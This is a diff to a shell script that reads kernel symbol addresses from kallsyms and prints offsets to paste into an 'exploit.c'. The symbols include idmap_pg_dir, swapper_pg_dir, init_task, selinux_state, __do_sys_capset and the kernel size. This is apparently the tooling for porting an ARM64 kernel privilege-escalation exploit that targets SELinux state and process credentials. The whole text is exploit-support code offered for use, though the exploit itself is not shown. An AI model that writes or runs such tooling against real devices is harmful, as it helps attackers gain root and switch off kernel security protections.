@@ -25,28 +25,53 @@ else
     do_sys_capset_end=$(grep -A1 -w "__do_sys_capset" "$KALLSYMS" | tail -1 | awk '{print $1}')
 fi
 text_start=$(grep -w "_text" "$KALLSYMS" | awk '{print $1}')
+text_end=$(grep -w "_end" "$KALLSYMS" | awk '{print $1}')
 
 echo "=== Update exploit.c with these values ==="
+echo ""
+
+# Calculate IDMAP_PG_DIR_OFFSET (idmap_pg_dir - _text)
+if [ -n "$idmap_pg_dir" ] && [ -n "$text_start" ]; then
+    idmap_offset=$((0x$idmap_pg_dir - 0x$text_start))
+    printf "Line 652: #define IDMAP_PG_DIR_OFFSET 0x%x\n" $idmap_offset
+else
+    echo "Warning: Could not calculate IDMAP_PG_DIR_OFFSET"
+fi
+
+# Calculate DEFAULT_KERNEL_SIZE_MB (_end - _text)
+if [ -n "$text_end" ] && [ -n "$text_start" ]; then
+    kernel_size=$((0x$text_end - 0x$text_start))
+    kernel_size_mb=$(( (kernel_size + 1048575) / 1048576 ))  # Round up to MB
+    printf "Line 958: #define DEFAULT_KERNEL_SIZE_MB %d\n" $kernel_size_mb
+else
+    echo "Warning: Could not calculate DEFAULT_KERNEL_SIZE_MB"
+fi
+
 echo ""
 
 # Calculate offsets
 if [ -n "$idmap_pg_dir" ] && [ -n "$swapper_pg_dir" ]; then
     swapper_offset=$((0x$swapper_pg_dir - 0x$idmap_pg_dir))
-    printf "Line 677: swapper_pg_dir_off = idmap_pg_dir_off + 0x%x;\n" $swapper_offset
+    printf "Line 693: swapper_pg_dir_off = idmap_pg_dir_off + 0x%x;\n" $swapper_offset
+    printf "Line 1448: uint64_t idmap_pg_dir_phys = ctx->swapper_pg_dir_phys - 0x%x;\n" $swapper_offset
 else
     echo "Warning: Could not calculate swapper_pg_dir offset"
 fi
 
 if [ -n "$idmap_pg_dir" ] && [ -n "$init_task" ]; then
     init_task_offset=$((0x$init_task - 0x$idmap_pg_dir))
-    printf "Line 680: uint64_t init_task_off = idmap_pg_dir_off + 0x%x;\n" $init_task_offset
+    printf "Line 696: uint64_t init_task_off = idmap_pg_dir_off + 0x%x;\n" $init_task_offset
+    printf "Line 707: swapper_pg_dir_off = fallback_idmap_pg_dir_off + 0x%x;\n" $swapper_offset
+    printf "Line 708: uint64_t init_task_off = fallback_idmap_pg_dir_off + 0x%x;\n" $init_task_offset
+    printf "Line 723: swapper_pg_dir_off = fallback_idmap_pg_dir_off + 0x%x;\n" $swapper_offset
+    printf "Line 724: uint64_t init_task_off = fallback_idmap_pg_dir_off + 0x%x;\n" $init_task_offset
 else
     echo "Warning: Could not calculate init_task offset"
 fi
 
 if [ -n "$idmap_pg_dir" ] && [ -n "$selinux_state" ]; then
     selinux_offset=$((0x$selinux_state - 0x$idmap_pg_dir))
-    printf "Line 1412: uint64_t selinux_state_offset = 0x%x;\n" $selinux_offset
+    printf "Line 1455: uint64_t selinux_state_offset = 0x%x;\n" $selinux_offset
 else
     echo "Warning: Could not calculate selinux_state offset"
 fi
